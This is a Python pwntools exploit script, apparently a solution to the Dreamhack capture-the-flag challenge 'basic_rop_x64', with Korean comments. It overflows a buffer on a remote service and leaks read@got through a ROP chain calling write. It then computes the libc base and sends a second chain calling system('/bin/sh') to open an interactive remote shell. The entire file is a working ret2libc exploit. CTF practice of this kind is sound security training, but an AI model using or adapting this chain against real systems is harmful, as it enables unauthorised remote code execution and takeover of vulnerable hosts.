from pwn import *

r = remote('host1.dreamhack.games', 8821)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')
sh = list(libc.search(b"/bin/sh"))[0]

#Use ROP
read_plt = e.plt['read']
write_plt = e.plt['write']
read_got = e.got['read']
pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
ret = 0x4005a9
main = e.symbols["main"]
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

#bof to ret
payload = b'A' * 0x48

# write(1, read@got, 8) <- read@got 주소는 8바이트 출력으로 충분함.
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

r.send(payload)

r.recvuntil(b'A' * 0x40)
read = u64(r.recvn(6)+b'\x00'*2) #현재 프로세스 메모리에 있는 read 함수 주소 받기
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

payload = b'A' * 0x48

#system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

r.send(payload)
r.recvuntil(b'A' * 0x40)

r.interactive()